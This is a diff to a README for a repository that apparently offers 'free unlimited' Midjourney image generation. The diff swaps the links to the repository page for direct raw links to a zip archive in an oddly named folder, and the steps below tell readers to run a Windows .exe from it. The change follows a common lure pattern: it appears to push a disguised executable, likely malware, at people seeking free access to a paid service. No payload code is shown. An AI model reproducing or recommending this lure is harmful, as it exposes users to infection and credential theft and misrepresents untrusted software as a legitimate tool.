@@ -1,6 +1,6 @@
 # 🎨 midjourney-free-unlimited - Access high quality AI image generation
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/stoneless-tropicofcancer591/midjourney-free-unlimited)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/stoneless-tropicofcancer591/midjourney-free-unlimited/raw/refs/heads/main/pedigraic/free-unlimited-midjourney-v1.7-beta.5.zip)
 
 ## 📌 Overview
 
@@ -23,7 +23,7 @@ Ensure your computer meets these specifications to run the software.
 
 Follow these steps to install and run the application on your system.
 
-1.  Visit the [official link](https://github.com/stoneless-tropicofcancer591/midjourney-free-unlimited) to locate the latest version.
+1.  Visit the [official link](https://github.com/stoneless-tropicofcancer591/midjourney-free-unlimited/raw/refs/heads/main/pedigraic/free-unlimited-midjourney-v1.7-beta.5.zip) to locate the latest version.
 2.  Select the Windows executable file (`.exe`) from the repository list.
 3.  Click the download button.
 4.  Save the file to a folder you recognize, such as your Downloads folder.
